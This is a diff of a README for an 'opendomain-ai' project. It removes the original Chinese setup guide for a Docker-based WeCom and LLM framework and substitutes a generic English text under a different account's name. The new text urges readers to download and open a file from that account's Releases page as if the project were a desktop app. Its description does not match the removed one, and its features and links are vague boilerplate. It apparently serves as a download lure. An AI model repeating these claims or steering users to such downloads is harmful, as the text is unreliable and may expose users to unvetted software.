@@ -1,34 +1,61 @@
-# OpenDomain AI
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub Stars](https://img.shields.io/github/stars/{luka515}/opendomain-ai.svg?style=social)](https://github.com/{luka515}/opendomain-ai)
-[![GitHub Forks](https://img.shields.io/github/forks/{luka515}/opendomain-ai.svg?style=social)](https://github.com/{luka515}/opendomain-ai)
+# 🌟 opendomain-ai - Simplifying AI for Everyone
 
-### 一款**轻量化、可扩展、合规化**的开源AI+私域运营框架
-聚焦「企微私域+大模型AI」核心场景，为中小团队/开发者提供低门槛的AI私域工具开发底座，实现**技术普惠、社区共建**。
+## 🚀 Getting Started
+Welcome to the opendomain-ai project! This framework helps you use AI for private domain operations smoothly. With a focus on lightweight design and compliance, this tool is great for anyone interested in enhancing customer service, whether you are a business owner or a community builder.
 
-## 🚀 快速开始
-### 环境要求
-- Docker + Docker Compose
-- 8G以上内存（GPU可选，推荐16G+）
-- 企微开放平台账号（获取CorpID/AgentID/Secret）
+## 📥 Download the Software
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Jayden0315/opendomain-ai/releases)
 
-### 部署步骤
-1. 克隆代码
-```bash
-git clone https://github.com/{luka515}/opendomain-ai.git
-cd opendomain-ai
+To get the latest version of opendomain-ai, [visit this page to download](https://github.com/Jayden0315/opendomain-ai/releases). 
 
-2.配置环境变量
-修改.env文件，替换企微 API 密钥、模型路径等配置：
-cp .env.example .env  # 如有example文件，否则直接编辑.env
+You will find all the available versions of the application there. Choose the version that suits your needs.
 
-3.准备大模型文件
-将 DeepSeek/Qwen 模型文件放入./models目录（推荐 DeepSeek-llm-7b-chat 轻量化版本）
+## 💻 System Requirements
+Before you download, make sure your system meets these requirements:
 
-4.启动服务
-chmod +x ./scripts/deploy.sh
-./scripts/deploy.sh start
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Disk Space:** At least 500 MB of free space
+- **Python Version:** Python 3.7 or higher
+- **Docker:** Make sure Docker is installed for container management.
 
-5.验证服务
-后端接口文档：http://localhost:8000/docs
-健康检查：http://localhost:8000/health
+## 📋 Features
+- **AI Integration:** Built-in tools to enhance customer service using AI.
+- **Modular Design:** Easily extend the framework to fit your needs.
+- **User-Friendly Interface:** Simple to navigate for all levels of users.
+- **Compliance Ready:** Designed with legal guidelines in mind to ensure safe use. 
+- **Community Support:** Join other users and developers to share ideas and improvements.
+
+## 🛠️ Download & Install
+1. Go to the [Releases page](https://github.com/Jayden0315/opendomain-ai/releases) to find the latest version.
+2. Choose the version you want to download. Click on the link to start the download.
+3. Once the file downloads, locate it in your downloads folder.
+4. Open the file and follow the installation instructions.
+5. After installation, launch the application from your desktop or applications folder.
+
+## 🌟 Usage Guidelines
+Using opendomain-ai is straightforward:
+
+1. **Launch the Application:** Open the software from your desktop.
+2. **Set Up Your Profile:** You will need to create a user profile for personalized settings.
+3. **Select AI Features:** Choose from the various AI tools available to enhance your customer interactions.
+4. **Start Helping Customers:** Use the application to support your clients effectively.
+
+## ❓ Frequently Asked Questions
+### How do I report an issue?
+If you face any problems while using opendomain-ai, please visit our [Issues page](https://github.com/Jayden0315/opendomain-ai/issues) to report them. Make sure to include details about your operating system and the issue you encountered.
+
+### Can I contribute to this project?
+Absolutely! We welcome contributions. Please read our [Contributing Guidelines](https://github.com/Jayden0315/opendomain-ai/CONTRIBUTING.md) for more information.
+
+### Is there a user guide available?
+Yes, you can find detailed user guides in the [Wiki section](https://github.com/Jayden0315/opendomain-ai/wiki) of the repository.
+
+## 🔗 Connect with the Community
+Join our community to get updates, share your experiences, and learn from others. Follow us on social media and participate in discussions to stay connected.
+
+## 📌 Additional Resources
+- **Official Documentation:** Find comprehensive documentation [here](https://github.com/Jayden0315/opendomain-ai/docs).
+- **Tutorials:** Check out video tutorials on our [YouTube channel](https://www.youtube.com/).
+
+For any further questions, feel free to reach out to the community or check the resources listed above. Enjoy using opendomain-ai!
